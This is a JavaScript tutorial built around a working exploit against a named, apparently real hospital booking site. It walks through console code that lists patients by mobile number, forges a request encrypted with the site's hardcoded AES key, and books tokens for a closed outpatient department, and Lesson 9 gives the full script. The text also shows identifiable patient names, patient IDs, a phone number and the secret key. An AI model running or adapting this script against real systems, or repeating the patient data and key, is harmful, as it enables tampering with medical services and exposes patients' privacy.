title: Learning
content:
-Lesson 1: Understanding the Environment – The Browser Console

The browser console is a JavaScript REPL (Read–Eval–Print Loop) that runs directly in the context of the current page.
When you press F12 and go to the Console tab, you can execute JavaScript just like it’s part of the page.

🔍 Crucial fact: Because you are on https://hms.canwinn.in/token_first, any fetch you write in the console is treated as same-origin. The browser will not block your requests due to CORS — that’s why we could freely call /generate_token.php without needing a proxy.

📝 What you learned today:

  • The console is your playground.
  • console.log() is your best friend for debugging.

Lesson 2: Fetching Data – The fetch API & Promises

The modern way to make network requests in JavaScript is fetch(). It returns a Promise, which is an object that represents a value that will be available later.

javascript
fetch('token_first?mobile=9871751631&ajax=1')
  .then(response => response.json())   // parse JSON from the response
  .then(data => console.log(data))     // use the parsed data
  .catch(error => console.error(error)); // handle errors

Explanation line‑by‑line:

  • fetch(...) – initiates a GET request to the given URL.
  • .then(response => response.json()) – when the server replies, the first .then receives the Response object. .json() is a method that reads the body and parses it as JSON. It also returns a Promise.
  • The second .then(data => ...) – receives the actual JavaScript object/array parsed from the JSON.
  • .catch(...) – if any network error or parsing error happens, it will be caught here.

🧠 Key learning:
fetch() works asynchronously. The code after the chain does not wait for it. That’s why we use .then() to handle the result.

Lesson 3: Storing Data in Global Variables

In the console, we often save data to window (or just as a global variable) so we can reuse it later.

javascript
fetch('token_first?mobile=9871751631&ajax=1')
  .then(res => res.json())
  .then(data => {
      window.patientsList = data.data;   // store the array of patients
      console.table(data.data);          // display nicely in a table
  });
  • console.table() prints an array of objects as a formatted table in the console — super useful for examining data.
  • window.patientsList is a global variable we can access anywhere later.

Lesson 4: Objects & Arrays in JavaScript

The response we received was a JSON object:

json
{
  "success": true,
  "data": [
    { "patientName": "SEEMA KHURANA", "patientId": "12313", ... },
    { "patientName": "MEET KHURANA", "patientId": "14178", ... }
  ]
}

In JavaScript, after .json() it becomes:

  • An object with properties success and data.
  • data is an array of objects, each representing a patient.

We can access properties with dot notation: data.data[0].patientName.

To find a specific patient:

javascript
let selectedPatient = patientsList.find(p => p.patientId == "14178");
  • find() loops over the array and returns the first element that makes the callback function return true.
  • p => p.patientId == "14178" is an arrow function (shorthand for function(p) { return p.patientId == "14178"; }).

Lesson 5: Building a Payload Object

We need to craft a JavaScript object that looks exactly like the one the real form would send.
From the page’s source code, we saw the structure:

javascript
{
  full_name: "MEET KHURANA",
  mobile: "9871751631",
  department: "59",          // numeric department code
  Uhid: "14178",            // patient ID
  patientInitial: "Mr."
}

We created this manually:

javascript
var payload = {
    full_name: selectedPatient.patientName,
    mobile: selectedPatient.mobileNumber,
    department: "59",   // we control this value → the vulnerability
    Uhid: selectedPatient.patientId,
    patientInitial: selectedPatient.patientInitial
};

💡 What’s important: We set department to "59" (General Physician) even though it was not visible in the dropdown. This is the whole trick.

Lesson 6: Encryption with CryptoJS

The page included the library crypto-js and defined a function:

javascript
function encryptData(data) {
  return CryptoJS.AES.encrypt(
    JSON.stringify(data),
    "CANWINN_SECRET_2025"
  ).toString();
}

Let’s break it down:

  • JSON.stringify(data) – converts our JavaScript object into a JSON string.
  • CryptoJS.AES.encrypt(...) – encrypts the string using AES with the key "CANWINN_SECRET_2025".
  • .toString() – returns the ciphertext as a Base64‑encoded string.

Because the function is global (it’s on window), we can call it directly from the console:

javascript
var encrypted = encryptData(payload);

Now encrypted contains a string that looks like "U2FsdGVkX18tj+iH61pP...".
This is the same format the server expects in the data parameter.

Lesson 7: URL Encoding

When we append the encrypted string to a URL, we must ensure special characters (like +, /, =) don’t break the URL. That’s what encodeURIComponent() does.

javascript
var url = 'generate_token.php?data=' + encodeURIComponent(encrypted);

If encrypted contains "abc+def", encodeURIComponent turns it into "abc%2Bdef" so the server receives the correct value.

Lesson 8: Sending the Final Request

javascript
fetch(url)
  .then(r => r.json())
  .then(data => {
      if (data.success) {
          console.log("🚨 Token:", data.token_no);
      } else {
          console.log("Failed:", data.message);
      }
  })
  .catch(err => console.error("Network error:", err));

This is identical to the fetch pattern we learned earlier. We just use the crafted URL and handle the server’s response.

The server responds with:

json
{"success":true, "token_no":"GENER59_25", "patientId":"14178"}

And we’ve proven the vulnerability.

Lesson 9: Putting It All Together – The Complete Script

Here’s the final all‑in‑one script we built, with comments explaining every step:

javascript
async function exploit() {
    // 1. Fetch all patients for a known mobile number
    let mobile = "9871751631";
    let res1 = await fetch(`token_first?mobile=${mobile}&ajax=1`);
    let data1 = await res1.json();
    console.table(data1.data);

    // 2. Choose a specific patient
    let patient = data1.data.find(p => p.patientId == "14178");
    console.log("Selected:", patient.patientName);

    // 3. Build the payload with a closed department
    let payload = {
        full_name: patient.patientName,
        mobile: patient.mobileNumber,
        department: "59",   // closed OPD code
        Uhid: patient.patientId,
        patientInitial: patient.patientInitial
    };

    // 4. Encrypt using the page's own function
    let encrypted = encryptData(payload);

    // 5. Send the forged request
    let res2 = await fetch(`generate_token.php?data=${encodeURIComponent(encrypted)}`);
    let tokenData = await res2.json();

    // 6. Output the result
    if (tokenData.success) {
        console.log(`🚨 Token generated: ${tokenData.token_no} for closed OPD!`);
    } else {
        console.log("Failed:", tokenData.message);
    }
}

exploit();

Notice the use of async and await – they make asynchronous code look like synchronous code, which is easier to read.
await pauses the function until the Promise resolves. This is just a modern alternative to .then() chains.

Lesson 10: What We Actually Proved – The Security Lesson

All these JavaScript tricks revealed one simple security failure:

The server never checked if the OPD was open.

The dropdown in the HTML was just a client‑side filter. Since the server accepted any department value inside the encrypted blob (as long as it was properly formatted), we could bypass it by simply building our own request.

Encryption didn’t protect anything because the key was right there in the page’s JavaScript. That’s obfuscation, not security.

As a tester (and now a JavaScript learner), you now know:

  • How to read the page’s source to find API endpoints and encryption details.
  • How to replicate front‑end logic in the console.
  • How to manipulate requests to bypass client‑side restrictions.

🔁 Recap Table

Step JavaScript Concept Used
Fetching patients fetch(), Promises, JSON parsing
Storing data Global variables (window.)
Selecting a patient Array .find(), arrow functions
Building payload Object literal syntax
Encryption External library (CryptoJS), global function
URL encoding encodeURIComponent()
Sending request fetch() with custom URL
Complete automation async/await, template literals

You started with zero JavaScript knowledge for security testing, and now you’ve built a full‑fledged exploit script. Next time, you’ll spot similar patterns instantly.

Keep practicing, and remember: always test with permission. Happy hacking!
